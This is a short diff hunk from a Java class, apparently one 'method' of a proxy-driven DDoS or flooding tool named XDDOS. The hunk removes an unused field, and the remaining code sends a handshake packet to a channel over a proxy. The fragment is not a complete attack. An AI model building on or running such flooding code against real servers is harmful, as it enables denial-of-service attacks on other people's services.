@@ -16,8 +16,6 @@ public class YooniksCry implements IMethod {
 
   private Handshake handshake = new Handshake(XDDOS.protcolID, XDDOS.srvRecord, XDDOS.port, 2);
 
-  private byte[] bytes = this.handshake.getWrappedPacket();
-
   public void accept(Channel channel, ProxyLoader.Proxy proxy) {
     channel.writeAndFlush(Unpooled.buffer().writeBytes(this.handshake.getWrappedPacket()));
     ByteBuf b = Unpooled.buffer();
